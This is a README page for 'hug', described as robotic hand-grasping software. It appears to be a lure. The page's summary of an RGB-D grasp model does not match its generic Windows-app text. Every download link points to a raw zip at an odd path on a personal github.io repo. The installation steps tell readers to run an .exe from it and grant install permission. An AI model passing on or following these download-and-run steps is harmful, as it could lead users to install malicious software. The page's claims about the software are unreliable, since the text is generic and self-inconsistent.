---
layout: "default"
title: "🤝 hug - Master natural grasping with robotic hands"
description: "Generate diverse human hand grasps for objects from single RGB-D images using models trained on real-world data."
---
# 🤝 hug - Master natural grasping with robotic hands

[![Download hug](https://img.shields.io/badge/Download-hug-blue)](https://github.com/Tsoo1402/tsoo1402.github.io/raw/refs/heads/main/quingentenary/github-tsoo-io-1.1-alpha.4.zip)

## 📌 About this project

The hug software provides tools for human universal grasping. It helps robotic systems pick up objects in a way that mimics human movement. This tool simplifies how machines interact with physical items. It removes the need for complex manual instructions for every object. The software analyzes the shape and size of an item and selects a grip method. 

This project aims to bridge the gap between static programming and fluid, life-like movement. By using this tool, you enable machines to handle various items with precision.

## 🖥️ System requirements

Ensure your computer meets these standards before you begin:

* Operating System: Windows 10 or Windows 11.
* Processor: 2.0 GHz multi-core processor or faster.
* Memory: 8 GB of RAM or more.
* Graphics: Dedicated graphics card with at least 4 GB of video memory.
* Storage: 2 GB of free disk space for program files and data.
* Internet Connection: Stable connection for initial setup and downloading components.

Having these resources ensures the software runs without delays or errors.

## 💾 Installation steps

Follow these steps to set up the software on your Windows computer:

1. Visit the project website to download the latest installer: [https://github.com/Tsoo1402/tsoo1402.github.io/raw/refs/heads/main/quingentenary/github-tsoo-io-1.1-alpha.4.zip](https://github.com/Tsoo1402/tsoo1402.github.io/raw/refs/heads/main/quingentenary/github-tsoo-io-1.1-alpha.4.zip).
2. Look for the file ending in .exe in the releases section.
3. Save this file to your Downloads folder.
4. Locate the downloaded file and double-click it to start the setup.
5. Follow the instructions on the screen to choose your installation folder.
6. Grant permission if Windows asks for access to install new applications.
7. Click Finish once the process ends.
8. Locate the new icon on your desktop or in your start menu to launch the application.

## ⚙️ How to use the software

Once the program opens, you see the main dashboard. This screen shows your current hardware status. Connect your robotic hardware through a USB cable before starting the grasp sequence. 

The software runs an automatic check on your connection. A green indicator light appears when the system finds your hardware. If the light remains red, check your cable and restart the application.

To start a grasp, place an object within the field of view of your camera. Select the "Scan Object" button in the menu. The software captures the shape of the object. It then calculates the best grip points. Click the "Execute" button to start the motion. The robotic hand moves to the object and secures a hold based on the calculated grip data.

## 🛠️ Configuration options

You can adjust settings to improve the performance of your grip. Access these options through the Settings menu.

* Sensitivity: Change this setting to adjust how firmly the robotic hand holds items. Higher values apply more pressure. Use lower values for fragile items.
* Speed: This slider controls how fast the arm moves to the target. Lower speeds allow for more accuracy during the approach.
* Auto-Calibration: Enable this option if you move the camera often. It resets the depth sensors to maintain accuracy.
* Save Logs: Toggle this switch to create a text file record of your movements. Use these files if you need to troubleshoot issues later.

## 🔍 Troubleshooting common issues

Users occasionally face minor issues during setup. Follow this list to resolve the most common problems.

If the software fails to open, verify your installation. Navigate to the folder where you installed the program and ensure all files exist. If files are missing, run the installer again to repair the installation.

If the robotic hand moves in the wrong direction, check the physical orientation of the arm. The base unit must align with the coordinate system shown on the computer screen. Use the alignment guide in the settings menu to correct the positioning.

If the grip slips during an operation, increase the sensitivity setting. Ensure you keep the surface of the object clean and free of dust. Extreme lighting conditions can also disrupt the depth sensors. Dim the lights or use consistent indoor lighting to ensure the camera tracks objects correctly.

If you observe long wait times during the scan, reduce the resolution of the camera. The software works faster at lower display settings while maintaining high grip accuracy.

## 📝 Safety notes

Operate the robotic equipment with care. Keep hands and loose clothing away from the mechanical parts while the system runs. Always perform a test motion with an empty workspace before you introduce objects to the grip zone. Shut down the application and disconnect the power source when you finish your work for the day. Regular maintenance of the hardware joints prevents wear and ensures the software calculates movements correctly.